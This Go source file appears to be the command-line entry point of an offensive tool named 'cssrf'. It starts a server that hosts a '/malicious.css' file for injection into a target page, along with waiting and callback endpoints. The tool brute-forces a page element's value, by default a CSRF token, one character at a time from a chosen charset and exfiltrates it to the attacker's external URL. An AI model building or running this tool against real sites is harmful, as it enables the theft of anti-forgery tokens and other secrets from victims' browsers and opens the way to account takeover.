package main

import (
	"fmt"
	"log"
	"net/http"

	"github.com/ariary/cssrf/pkg/cssrf"
	"github.com/ariary/go-utils/pkg/color"
	"github.com/spf13/cobra"
)

func main() {
	var config cssrf.Config
	//CMD ROOT
	var rootCmd = &cobra.Command{Use: "cssrf",
		Short: "only grab information from notion page. No HTTP ingoing traffic is used to work.",
		Args:  cobra.MinimumNArgs(0),
		Run: func(cmd *cobra.Command, args []string) {
			// create server
			m := http.NewServeMux()
			s := http.Server{Addr: ":" + config.Port, Handler: m}
			// init templates
			cssrf.InitTemplates(&config)

			// Init channels
			config.Channels = make([]chan string, config.Length)
			for i := 0; i < config.Length; i++ {
				config.Channels[i] = make(chan string)
			}
			go func() { config.Channels[0] <- "Test" }()
			// test := <-config.Channels[0]
			// fmt.Println(test)

			// define handlers
			m.Handle("/malicious.css", cssrf.FirstLoad(&config))
			m.Handle("/waiting", cssrf.Waiting(&config))
			m.Handle("/callback", cssrf.Callback(&config))
			fmt.Println("🐿️ Seeking data", color.Italic(color.Yellow(config.Elt)))
			fmt.Printf(color.Italic("Desired length %s\n"), color.Yellow(config.Length))
			fmt.Printf(color.Italic("Charset used '%s'\n"), color.Yellow(config.Charset))
			fmt.Printf("🌳 Start server on localhost:%s (%s)\n", config.Port, config.ExternalUrl)
			fmt.Printf(color.Italic(color.Yellow("→ Inject %s/malicious.css\n")), config.ExternalUrl)
			if err := s.ListenAndServe(); err != nil && err != http.ErrServerClosed {
				log.Fatal(err)
			}
		}}

	// FLAGS
	rootCmd.PersistentFlags().StringVarP(&config.Port, "port", "p", "9292", "server listening port")
	rootCmd.PersistentFlags().StringVarP(&config.ExternalUrl, "url", "u", "localhost", "external reachable url of the server")
	rootCmd.PersistentFlags().StringVarP(&config.Charset, "charset", "c", "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789", "charset use to find data (bruteforce)")
	rootCmd.PersistentFlags().StringVarP(&config.Prefix, "prefix", "b", "", "already known part of the data to extract")
	rootCmd.PersistentFlags().StringVarP(&config.Elt, "element", "e", "csrf", "id of the element to retrieve")
	rootCmd.PersistentFlags().IntVarP(&config.Length, "len", "l", 32, "data length to exfiltrate")
	rootCmd.Execute()
}
